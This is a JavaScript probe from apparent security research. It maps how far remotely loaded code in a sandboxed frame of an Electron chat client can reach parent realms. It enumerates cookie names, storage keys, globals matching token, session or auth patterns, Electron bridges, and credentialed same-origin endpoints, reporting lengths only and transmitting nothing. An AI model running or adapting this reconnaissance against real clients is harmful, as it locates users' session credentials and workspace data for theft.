/* reach.js - published to a public GitHub repo, served via jsDelivr /gh/.
   Loaded by test-jsdelivr-reach.html.

   Follow-up to capabilities.js. That established that remote code runs and that
   the parent realm is same-origin. This asks the question that follows: how far
   up the frame chain does that reach go, and what is in each realm it reaches?

   Same rules as before, and they matter MORE here because the realms above may
   hold real workspace state:
     - PRESENCE AND SHAPE ONLY. Names and lengths; never a value.
     - NOTHING IS TRANSMITTED. No foreign-origin request of any kind.
     - NOTHING IS CHANGED. No storage write, no service worker registered, no
       navigation performed. Where a capability would require altering state to
       confirm, it is reported as INFERRED and left unexercised.
     - EVERY ROW IS TAGGED WITH ITS REALM, so results from this harness's own
       realm are never mistaken for the host's.
   Output goes to the DOM. Nothing uses console. */
(function () {
  var C = [];
  function add(realm, area, title, result, sev, note) {
    C.push({ realm: realm, area: area, title: title, result: String(result),
             sev: sev || "info", note: note || null });
  }
  function shape(v) {
    if (v === null) return "null";
    if (v === undefined) return "undefined";
    var t = typeof v;
    if (t === "string") return "string(len=" + v.length + ")";
    if (t === "function") return "function";
    if (t === "object") {
      try { return (Array.isArray(v) ? "array(len=" + v.length : "object(keys=" + Object.keys(v).length) + ")"; }
      catch (e) { return "object(opaque)"; }
    }
    return t;
  }
  function names(list, cap) {
    cap = cap || 30;
    return list.slice(0, cap).join(", ") + (list.length > cap ? "  …and " + (list.length - cap) + " more" : "");
  }
  function tryFn(fn, d) { try { return fn(); } catch (e) { return d === undefined ? ("threw: " + e.name) : d; } }

  /* A pristine global namespace, for diffing. Taken once from a blank iframe in
     THIS realm; a regex over key names produces false positives (customElements
     ends in "ts", oncontextrestored contains "store") and noise in a report is
     worse than a missing row. */
  var BASELINE = tryFn(function () {
    var f = document.createElement("iframe");
    f.style.display = "none"; f.src = "about:blank";
    document.body.appendChild(f);
    var b = Object.create(null);
    Object.keys(f.contentWindow).forEach(function (k) { b[k] = 1; });
    f.remove();
    return Object.keys(b).length > 50 ? b : null;
  }, null);

  /* ---------- Walk the frame chain from self to top ---------- */
  var chain = [], w = window, depth = 0;
  while (depth < 12) {
    chain.push({ depth: depth, win: w });
    if (w === w.parent) break;
    w = tryFn(function () { return w.parent; }, null);
    if (!w) break;
    depth++;
  }
  add("self", "frames", "frame chain depth", chain.length + " realm(s) from self to top",
      chain.length > 1 ? "info" : "info",
      "self is depth 0; each further entry is one step toward window.top.");

  chain.forEach(function (entry) {
    var tag = entry.depth === 0 ? "self" : (entry.win === window.top ? "top(d" + entry.depth + ")" : "parent(d" + entry.depth + ")");
    var W = entry.win;

    /* Same-origin reachability is the gate for everything below it. */
    var href = tryFn(function () { return W.location.href; });
    var reachable = typeof href === "string" && href.indexOf("threw:") !== 0;

    add(tag, "realm", "location readable", reachable ? href.slice(0, 200) : href,
        entry.depth === 0 ? "info" : (reachable ? "crit" : "none"),
        entry.depth === 0 ? null
          : (reachable
              ? "Same-origin from the sandboxed realm, so this document's DOM, storage and globals " +
                "are all reachable by the remotely-loaded script - the rows below are read out of it."
              : "Cross-origin: the same-origin policy blocks access, which is the expected containment."));
    if (!reachable) return;
    if (entry.depth === 0) return;   /* self is covered by capabilities.js */

    var D = tryFn(function () { return W.document; }, null);
    if (D) {
      add(tag, "dom", "document title / element count",
          shape(tryFn(function () { return D.title; })) + " / " +
          tryFn(function () { return String(D.querySelectorAll("*").length); }), "crit",
          "Read from the parent document. Title reported as a length, not text.");
      add(tag, "dom", "body text reachable", shape(tryFn(function () { return D.body ? D.body.innerText : ""; })),
          "crit", "Length only. Whatever this surface renders is readable by the sandboxed script.");
      var inp = tryFn(function () { return D.querySelectorAll("input,textarea,select"); }, []);
      var filled = tryFn(function () {
        var n = 0; Array.prototype.forEach.call(inp, function (e) { if (e.value && e.value.length) n++; }); return n;
      }, 0);
      add(tag, "dom", "form fields in the parent realm",
          inp.length + " field(s), " + filled + " non-empty",
          filled ? "crit" : "info", "Counts only - no field value is read into this report.");
      add(tag, "dom", "iframes in this realm",
          tryFn(function () { return String(D.querySelectorAll("iframe").length); }), "info");
    }

    var ck = tryFn(function () { var c = W.document.cookie; return c ? c.split(/; */) : []; }, []);
    add(tag, "storage", "cookies readable from this realm",
        ck.length ? ck.length + " cookie(s)" : "none readable",
        ck.length ? "crit" : "info",
        ck.length ? "names: " + names(ck.map(function (c) { return c.split("=")[0]; })) +
                    "\nvalue lengths: " + ck.map(function (c) { return (c.split("=")[1] || "").length; }).join(",") +
                    "\n\nHttpOnly cookies are absent by definition, so this is the script-visible subset."
                  : null);

    ["localStorage", "sessionStorage"].forEach(function (which) {
      var r = tryFn(function () {
        var st = W[which], ks = [];
        for (var i = 0; i < st.length; i++) ks.push(st.key(i));
        return { n: st.length, keys: ks, sizes: ks.map(function (k) { return (st.getItem(k) || "").length; }) };
      });
      if (typeof r === "string") { add(tag, "storage", which, r, "info"); return; }
      add(tag, "storage", which, r.n ? r.n + " key(s) readable" : "empty",
          r.n ? "crit" : "info",
          r.n ? "keys: " + names(r.keys) + "\nvalue lengths: " + r.sizes.slice(0, 30).join(",") +
                "\n\nRead-only enumeration. Nothing written, no value reproduced." : null);
    });

    if (BASELINE) {
      var inj = tryFn(function () {
        return Object.keys(W).filter(function (k) { return !(k in BASELINE); });
      }, null);
      if (inj && inj.length) {
        var hot = inj.filter(function (k) {
          return /^(TS|boot_data)$/.test(k) || /^__(INITIAL|NEXT|NUXT|REDUX|APOLLO|webpack)/.test(k) ||
                 /^webpackChunk/.test(k) || /(^|_)(token|session|auth|user|team|workspace|store|config|state)(_|$)/i.test(k);
        });
        add(tag, "globals", "app-injected globals in this realm", inj.length + " injected",
            "high",
            inj.slice(0, 30).map(function (k) { return k + " = " + shape(tryFn(function () { return W[k]; })); }).join("\n") +
            (inj.length > 30 ? "\n…and " + (inj.length - 30) + " more" : "") +
            "\n\nDiffed against a blank realm, so these are genuinely application-injected.");
        if (hot.length) {
          add(tag, "globals", "injected globals likely holding app state",
              hot.length + ": " + names(hot), "crit",
              hot.map(function (k) { return k + " = " + shape(tryFn(function () { return W[k]; })); }).join("\n") +
              "\n\nShapes only. This is where a surface's tokens and workspace identifiers usually live.");
        }
      } else if (inj) {
        add(tag, "globals", "app-injected globals in this realm", "none - matches a blank baseline", "info");
      }
    }

    /* Navigation and storage writes are NOT performed. Same-origin access
       implies both; confirming them would mean altering a realm we only need to
       characterise. Reported as inferred so a write-up can say so honestly. */
    add(tag, "capability", "could navigate or write to this realm",
        "INFERRED from same-origin access - not exercised", "high",
        "location is writable and storage is writable on a same-origin realm. Neither was " +
        "attempted: this probe does not navigate the host or persist anything. State the " +
        "capability as inferred in a report rather than claiming a demonstration.");
  });

  /* ---------- Electron / node reachability, per realm ---------- */
  var nodeish = [];
  ["require", "process", "module", "exports", "global", "Buffer", "__dirname", "__filename"]
    .forEach(function (k) { if (typeof window[k] !== "undefined") nodeish.push(k + ":" + typeof window[k]); });
  add("self", "electron", "node globals on window", nodeish.length ? nodeish.join(", ") : "none",
      nodeish.length ? "crit" : "none",
      nodeish.length
        ? "require() is NOT invoked - reachability established by typeof alone. If these resolve real " +
          "node builtins this stops being a web-sandbox issue and becomes execution outside it."
        : "No node globals in this realm: contextIsolation / nodeIntegration look correctly configured.");
  add("self", "electron", "userAgent", shape(navigator.userAgent), "info",
      "ua: " + navigator.userAgent +
      "\n\nThe Electron and Slack build versions here pin down exactly which client was tested - " +
      "worth quoting verbatim in a report.");

  var bridge = tryFn(function () {
    return Object.keys(window).filter(function (k) {
      return /^(electron|__electron|ipc|ipcRenderer|desktop|slack|__slack|native|preload|bridge|webkit)/i.test(k);
    });
  }, []);
  add("self", "electron", "possible preload / contextBridge surfaces",
      bridge.length ? names(bridge) : "none matched",
      bridge.length ? "high" : "none",
      bridge.length ? bridge.map(function (k) { return k + " = " + shape(window[k]); }).join("\n") +
                      "\n\nNames and shapes only. A bridge forwarding IPC is the pivot from renderer " +
                      "JS to main-process capability - enumerate these by hand." : null);

  /* ---------- postMessage boundary ---------- */
  var jobs = [];
  jobs.push(new Promise(function (res) {
    var seen = [], probeTag = "reach-probe-" + Math.random().toString(36).slice(2, 8);
    function onMsg(e) {
      seen.push({ origin: e.origin, data: shape(e.data),
                  mine: typeof e.data === "string" && e.data.indexOf(probeTag) === 0 });
    }
    window.addEventListener("message", onMsg, false);

    /* One benign ping upward, then listen. Deliberately not a fuzz of the
       bridge's command surface - this observes whether a boundary responds at
       all, which is what characterising the boundary requires. */
    tryFn(function () { if (window.parent !== window) window.parent.postMessage(probeTag + ":ping", "*"); });

    setTimeout(function () {
      window.removeEventListener("message", onMsg, false);
      var replies = seen.filter(function (s) { return s.mine; });
      add("self", "postmessage", "messages observed in 2.5s",
          seen.length ? seen.length + " message(s), " + replies.length + " replying to our ping" : "none",
          replies.length ? "high" : (seen.length ? "med" : "info"),
          seen.length
            ? seen.slice(0, 12).map(function (s) {
                return "origin=" + (s.origin || "(empty)") + "  data=" + s.data + (s.mine ? "  <- reply to our ping" : "");
              }).join("\n") +
              "\n\nShapes only. A host that answers an unsolicited message from sandboxed content has " +
              "an interface worth enumerating by hand."
            : "No traffic and no reply to a benign ping - either there is no postMessage bridge or it " +
              "ignores unsolicited input.");
      res();
    }, 2500);
  }));

  /* ---------- Same-origin request reachability, paths supplied by the operator ---------- */
  jobs.push(new Promise(function (res) {
    var paths = (globalThis.__reachPaths || ["/"]).slice(0, 12);
    if (typeof fetch !== "function") { add("self", "net", "same-origin fetch", "unavailable", "info"); return res(); }
    var done = 0;
    function tick() { if (++done >= paths.length) res(); }
    paths.forEach(function (p) {
      var u;
      try { u = new URL(p, location.origin).href; } catch (e) { tick(); return; }
      fetch(u, { cache: "no-store", credentials: "include" })
        .then(function (r) { return r.text().then(function (t) { return { s: r.status, ct: r.headers.get("content-type"), len: t.length }; }); })
        .then(function (o) {
          add("self", "net", "GET " + p, "HTTP " + o.s + "  " + (o.ct || "?") + "  body " + o.len + " chars",
              o.s >= 200 && o.s < 300 ? "high" : "info",
              "Status, type and LENGTH only - no response body is reproduced or stored. Requests " +
              "carry credentials, so a 2xx here means remote code reads this endpoint as the " +
              "logged-in user.");
          tick();
        })["catch"](function (e) { add("self", "net", "GET " + p, "failed: " + (e && e.name), "info"); tick(); });
    });
    setTimeout(res, 9000);
  }));

  globalThis.__reach = C;
  Promise.all(jobs).then(function () {
    globalThis.__reach = C;
    if (typeof globalThis.__reachDone === "function") globalThis.__reachDone(C);
  });
})();
